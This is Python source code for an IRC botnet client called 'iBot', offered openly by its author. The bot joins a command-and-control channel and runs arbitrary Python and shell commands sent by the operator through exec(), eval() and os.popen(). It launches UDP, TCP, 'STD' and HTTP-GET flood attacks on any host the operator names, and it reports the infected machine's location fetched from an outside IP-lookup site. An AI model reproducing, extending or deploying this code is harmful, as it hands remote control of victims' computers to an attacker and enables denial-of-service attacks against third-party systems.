"""
iBot, a simple IRC botnet (No authentication)
Written by nullnullnullnullnull
Want something custom? contact me on pastebin (lol)

Features:
- SSL/TLS support
- DDoS functionality
    - UDP, STD, TCP and HTTP flood
- On the fly code execution
    - using exec(), eval() and os.popen()
- Easy usage
    - Just configure, and iBot is ready to be used!

- Commands
    - All commands start with the prefix ("$" by default)
    - help/?/helpme
        - Displays this message
        - Usage: help
    - exit/close/kill/die/shutdown/quit
        - Kills the bot
        - Usage: kill
    - exec/pyexec
        - exec()'s python code
        - Usage: exec <code>
    - eval/pyeval
        - eval()'s python code
        - Usage: eval <expression>
    - osexec/sh
        - Executes OS commands
        - Usage: osexec <command>
    - udp/udpflood
        - Starts an UDP flood
        - Usage: udp <target host> <target port> <attack duration>
    - tcp/tcpflood
        - Starts an TCP flood
        - Usage: tcp <target host> <target port> <attack duration>
    - std/stdflood
        - Starts an UDP-STD flood
        - Usage: udp <target host> <target port> <attack duration>
    - http/httpflood
        - Starts an HTTP-GET flood
        - Usage: http <target url> <attack duration>
"""

import socket, os, ssl, time, traceback, requests, sys
from random import choice, choices, randbytes
from threading import Thread

# configuration
CNC_SERVER = "127.0.0.1"
CNC_PORT = 6697
CNC_USE_SSL = True
CNC_IS_SELFSIGNED = True
CNC_CHANNEL = "#thecakeisalie"

# connection info
CONNECT_TRIES = 40
CONNECT_TIMEOUT = 20 # timeout during connection phase

# bot info
BOT_PREFIX = "$"
BOT_NICK = "[iBot-v{version}|{country_code}|{randomstr}]" # see the formatnick() function for more info
BOT_NAME = "iBot-v{version}-{randomstr}"
BOT_VERSION = "1"
BOT_QUIT_MESSAGES = [
    "iBot rules",
    "null" * 5,
    "with love from russia",

    # why latin phrases?
    # because latin is awesome
    "veni, vidi, vici",
    "absolutum dominium",
    "abundans cautela non nocet",
    "ab uno disce omnes",
    "ad altiora tendo",
    "ad infinitum",
    "ad vitam aeternam"
]

IRC_BUFFER = 2048

if not CNC_CHANNEL.startswith("#"):
    CNC_CHANNEL = f"#{CNC_CHANNEL}"

try:
    ipinfo = requests.get("https://myip.wtf/json").json()
except Exception:
    ipinfo = {}

def randstr(
    length: int,
    charset: str | list[str] = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
    ) -> str:
    """
    Generates a @length characters long string from @charset

    Args:
        length int: Length of the string
        charset str or list[str]: Allowed characters
    
    Returns:
        str: Randomly generated string
    """

    return "".join(
        choices(charset, k=length)
    )

def formatnick(
    raw: str
    ) -> str:
    """
    Formats the nickname/name

    Args:
        raw str: Raw nickname
    
    Returns:
        str: Formatted nickname
    """

    try:
        ver = sys.version_info
        return raw.format(
            version=BOT_VERSION,
            country_code=ipinfo.get("YourFuckingCountryCode", "??"),
            ipaddr=ipinfo.get("YourFuckingIPAddress", "127.0.0.1"),
            hostname=ipinfo.get("YourFuckingHostname", "localhost"),
            isp=ipinfo.get("YourFuckingISP", "??"),
            country=ipinfo.get("YourFuckingCountry", "??"),
            city=ipinfo.get("YourFuckingCity", "??"),
            os=sys.platform,
            pyver=f"{ver.major}.{ver.minor}.{ver.micro}",
            randomstr=randstr(5)
        )
    
    except Exception:
        print(f"\n[ERROR] Exception occurred")
        print(f"[ERROR] Stacktrace:")
        print(traceback.format_exc())

        return raw # return raw, incase of error

def os_exec(cmd: str):

    try:
        fd = os.popen(cmd)
        ret = fd.read()
        fd.close()
    except Exception:
        ret = ""
    
    return ret

class Floods:

    # STD flood strings
    strings = [
        b"git gud skid",
        b"https://pastebin.com/u/nullnullnullnullnull",
        b"tfw no gf",
        b"hella booters",
        b"420 mgl doritoz",
        b"std",
        b"dts",
        b"YakuzaBotnet",
        b"Scarface1337",
        b"krebs",
        b"\x6D\x21\x65\x66\x67\x60\x60\x6C\x21\x65\x66\x60\x35\x2A" + b"A" * 2663 + b"1\x6C\x65\x60\x30\x60\x2C\x65\x64\x54",
        b"RyMGang" * 255,
        b"9u123448u124au814d4x10",
        b"cyppsxe20t3pu2m8bl88qsyd6uhhl22onwrjn76gs9tad69ms27q7a5knzmcfaj489791cmdwjfveeij9efmoieks6ob1t8eviul7z6fuhq1nkr6jn4piqisqxmabl4ocu2pjpprkjm7bfjh3ts1ul",
        b"yfj82z4ou6nd3pig3borbrrqhcve6n56xyjzq68o7yd1axh4r0gtpgyy9fj36nc2w",
        b"y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb",
        b"7tyv7w4bvy8t73y45t09uctyyz2qa3wxs4ce5rv6tb7yn8umi9,minuyubtvrcex34xw3e5rfv7ytdfgw8eurfg8wergiurg29348uadsbf",
        b"01010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101010101010101010110011010101010101010101010101010101010101010101010101010101011001101010101010101010101010101010101010101010101010101010101100110101010101010101010101010101010101010101",
    ]
    
    def udpflood(
        target: str, 
        port: int, 
        duration: float
        ) -> None:
        """
        Starts an UDP flood

        Args:
            target str: target host
            port int: target port
            duration float: attack duration
        
        Returns:
            None: Nothing
        """

        stoptime = time.time() + duration
        sock = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM
        )

        while time.time() < stoptime:
            try:
                sock.sendto(
                    randbytes(512), (target, port)
                )
            
            except Exception:
                continue
    
    def stdflood(
        target: str, 
        port: int, 
        duration: float
        ) -> None:
        """
        Starts an UDP-STD flood

        Args:
            target str: target host
            port int: target port
            duration float: attack duration
        
        Returns:
            None: Nothing
        """

        stoptime = time.time() + duration
        sock = socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM
        )

        while time.time() < stoptime:
            try:
                sock.sendto(
                    choice(strings), (target, port)
                )
            
            except Exception:
                continue
        
    def tcpflood(
        target: str, 
        port: int, 
        duration: float
        ) -> None:
        """
        Starts an TCP flood

        Args:
            target str: target host
            port int: target port
            duration float: attack duration
        
        Returns:
            None: Nothing
        """

        stoptime = time.time() + duration
        sock = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
        )

        connected = False
        for _ in range(5):
            try: 
                sock.connect((target, port))
                connected = True

                break
            except Exception:
                time.sleep(1)
                continue
        
        if not connected:
            return

        while time.time() < stoptime:
            try:
                sock.send(
                    randbytes(512)
                )
            
            except Exception:
                continue
    
    def httpflood(
        target: str, 
        duration: float
        ) -> None:
        """
        Starts an HTTP-GET flood

        Args:
            target str: target host
            duration float: attack duration
        
        Returns:
            None: Nothing
        """

        stoptime = time.time() + duration

        session = requests.session()
        session.verify = False
        session.cert = None

        while time.time() < stoptime:
            try:
                session.get(
                    target,
                    verify=False,
                    headers={
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Dnt" : "1",
                        "Sec-Fetch-Dest": "document",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Site": "cross-site",
                        "Sec-Fetch-User":"?1",
                        "Te": "trailers",
                        "Upgrade-Insecure-Requests": "1",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:103.0) Gecko/20100101 Firefox/103.0"
                    },
                    timeout=(5, .000000001) # hacky way of dropping requests the nanosecond they get sent
                )
            
            except Exception:
                continue

class Client:
    def __init__(self):
        self.sock = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
        )

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(None) # disable timeout

        if CNC_USE_SSL:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.options&=~ssl.OP_ENABLE_MIDDLEBOX_COMPAT # makes it look like TLS 1.2 traffic
            context.options&=~ssl.OP_NO_SSLv2 # disables SSL v2
            context.options&=~ssl.OP_NO_SSLv3 # disables SSL v3
            context.options&=~ssl.OP_ALL # workarounds for bugs

            check_hostname = True
            verify_mode = ssl.CERT_REQUIRED
            if CNC_IS_SELFSIGNED:
                check_hostname = False
                verify_mode = ssl.CERT_NONE

            context.check_hostname = check_hostname
            context.verify_mode = verify_mode

            self.sock = context.wrap_socket(
                self.sock, server_hostname=CNC_SERVER
            )

        self.isconnected = False
        self.hasjoined = False

        self.nick = formatnick(BOT_NICK)
        self.name = formatnick(BOT_NAME)
    
    def close(
        self, 
        msg: str | None = None
        ) -> None:
        """
        Closes the connection, and sends an QUIT message if we're connected

        Args:
            msg str or None: QUIT message, leave empty for rando 

        Returns:
            None: Nothing.
        """

        if self.isconnected and self.hasjoined and self.sock.fileno() > 0:

            if not msg:
                msg = choice(BOT_QUIT_MESSAGES)

            self.irc_msg(f"QUIT :{msg}")

        self.sock.close()
    
    def irc_msg(self, data: str) -> None:
        """
        Sends an IRC chat command

        Args:
            data str: Command and arguments to send

        Returns:
            None: Nothing.
        """

        self.sock.sendall(
            f"{data}\r\n".encode()
        )
    
    def priv_msg(
        self, 
        msg: str, 
        chan: str = CNC_CHANNEL
        ) -> None:
        """
        Sends a PRIVMSG message to @chan

        Args:
            msg str: Message to send
            chan str: Channel to send message to
        
        Returns:
            None: Nothing.
        """

        self.irc_msg(f"PRIVMSG {chan} :{msg}")
    
    def handler(self) -> None:
        """
        Starts the command handler

        Returns:
            None: Nothing.
        """

        while self.isconnected:
            try:
                recv = self.sock.recv(IRC_BUFFER)
                if not recv:
                    print("[WARN] No data, stopping...")

                    self.isconnected = False
                    break

                recv = recv.decode(
                    errors="ignore"
                ).rstrip().strip()

                print(f"[IRC] {recv}")

                if recv.upper().startswith("PING"):
                    cookie = recv.split(":")[1].rstrip()

                    print(f"[INFO] Got PING, sending PONG with cookie '{cookie}'")
                    self.irc_msg(f"PONG :{cookie}")
                    continue

                if "End of MOTD command" in recv:

                    print(f"[INFO] Joining '{CNC_CHANNEL}'")
                    self.irc_msg(f"JOIN {CNC_CHANNEL}")

                    self.hasjoined = True
                
                elif "sername taken" in recv:
                    self.nick = formatnick(BOT_NICK)
                    self.irc_msg(f"NICK {self.nick}")

                if recv.upper().find("PRIVMSG") != -1 and self.hasjoined:

                    # ugly af
                    # but regex was even worse
                    name = recv.split("!")[1].split("@")[0]
                    args = [
                        arg.rstrip()
                        for arg in recv.split("PRIVMSG", 1)[1].split(":", 1)[1].split(" ")
                    ]

                    cmd = args[0]
                    args = args[1:] # strip command
                    args_raw = " ".join(args[1:])
                    if cmd.startswith(BOT_PREFIX):
                        cmd = cmd.lstrip(BOT_PREFIX)

                        print(f"[INFO] Ready to execute '{cmd}'")

                        match cmd:
                            case "help" | "?" | "helpme":

                                # why not chunk?
                                # because all bots will be screaming
                                # over of eachother then
                                self.priv_msg("""
- All commands start with the prefix ("$" by default)
- help/?/helpme
    - Displays this message
    - Usage: help
- exit/close/kill/die/shutdown/quit
    - Kills the bot
    - Usage: kill
- exec/pyexec
    - exec()'s python code
    - Usage: exec <code>
- eval/pyeval
    - eval()'s python code
    - Usage: eval <expression>
- osexec/sh
    - Executes OS commands
    - Usage: osexec <command>
- udp/udpflood
    - Starts an UDP flood
    - Usage: udp <target host> <target port> <attack duration>
- tcp/tcpflood
    - Starts an TCP flood
    - Usage: tcp <target host> <target port> <attack duration>
- std/stdflood
    - Starts an UDP-STD flood
    - Usage: udp <target host> <target port> <attack duration>
- http/httpflood
    - Starts an HTTP-GET flood
    - Usage: http <target url> <attack duration>
""")

                            case "exit" | "close" | "kill" | "die" | "shutdown" | "quit":
                                self.close(f"Killed by {name}")

                            case "exec" | "pyexec":

                                exec(args_raw)
                                self.priv_msg("Executed successfully")
                            
                            case "eval" | "pyeval":

                                eval(args_raw)
                                self.priv_msg("Executed successfully")
                            
                            case "osexec" | "sh":

                                resp = os_exec(args_raw)
                                if len(resp) == 0:
                                    self.priv_msg("Error while executing command")
                                    continue
                                
                                self.priv_msg(f"Output: {resp.rstrip()}")
                            
                            case "udp" | "udpflood":

                                if len(args) != 3:
                                    self.priv_msg(f"Invalid command, syntax: {BOT_PREFIX}{cmd} <target host> <target port> <attack duration>")
                                    continue

                                target, port, duration = args[0], int(args[1]), float(args[2])

                                self.priv_msg(f"Flooding '{target}:{port}' for {duration} seconds")
                                Thread(
                                    target=Floods.udpflood,
                                    args=(target, port, duration,),
                                    daemon=True
                                ).start()
                            
                            case "tcp" | "tcpflood":

                                if len(args) != 3:
                                    self.priv_msg(f"Invalid command, syntax: {BOT_PREFIX}{cmd} <target host> <target port> <attack duration>")
                                    continue

                                target, port, duration = args[0], int(args[1]), float(args[2])

                                self.priv_msg(f"Flooding '{target}:{port}' for {duration} seconds")
                                Thread(
                                    target=Floods.tcpflood,
                                    args=(target, port, duration,),
                                    daemon=True
                                ).start()
                            
                            case "std" | "stdflood":

                                if len(args) != 3:
                                    self.priv_msg(f"Invalid command, syntax: {BOT_PREFIX}{cmd} <target host> <target port> <attack duration>")
                                    continue

                                target, port, duration = args[0], int(args[1]), float(args[2])

                                self.priv_msg(f"Flooding '{target}:{port}' for {duration} seconds")
                                Thread(
                                    target=Floods.stdflood,
                                    args=(target, port, duration,),
                                    daemon=True
                                ).start()
                            
                            case "http" | "httplood":

                                if len(args) != 2:
                                    self.priv_msg(f"Invalid command, syntax: {BOT_PREFIX}{cmd} <target url> <attack duration>")
                                    continue

                                target, duration = args[0], float(args[1])

                                self.priv_msg(f"Flooding '{target}' for {duration} seconds")
                                Thread(
                                    target=Floods.httpflood,
                                    args=(target, duration,),
                                    daemon=True
                                ).start()
                            
                            case _: # silently ignore 
                                continue
            
            except KeyboardInterrupt:
                break

            except:
                print(f"\n[ERROR] Exception occurred")
                print(f"[ERROR] Stacktrace:")
                print(traceback.format_exc())
                break

        print("\n[INFO] Shutting down")
        self.close()
        
    def connect(self) -> None:
        """
        Connect to the CNC IRC server

        Returns:
            None: Nothing.
        """

        self.sock.settimeout(CONNECT_TIMEOUT)
        for i in range(1, CONNECT_TRIES):

            try:

                print("[INFO] Connecting")
                self.sock.connect(
                    (CNC_SERVER, CNC_PORT)
                )

                self.isconnected = True

                break
            except Exception:
                print(f"[ERROR] Failed to connect, retrying in {2*i} seconds")
                print(f"[ERROR] Stacktrace")
                print(traceback.format_exc())

                time.sleep(2 * i)
        
        if not self.isconnected:
            print("[FATAL] Could not connect!")
            self.close()

        self.sock.settimeout(None) # disable timeout
        
        print("[INFO] Sending information")
        self.irc_msg(f"USER {self.name} 8 *: {self.name}")
        self.irc_msg(f"NICK {self.nick}")
        
        self.handler()

if __name__ == "__main__":
    client = Client()
    client.connect()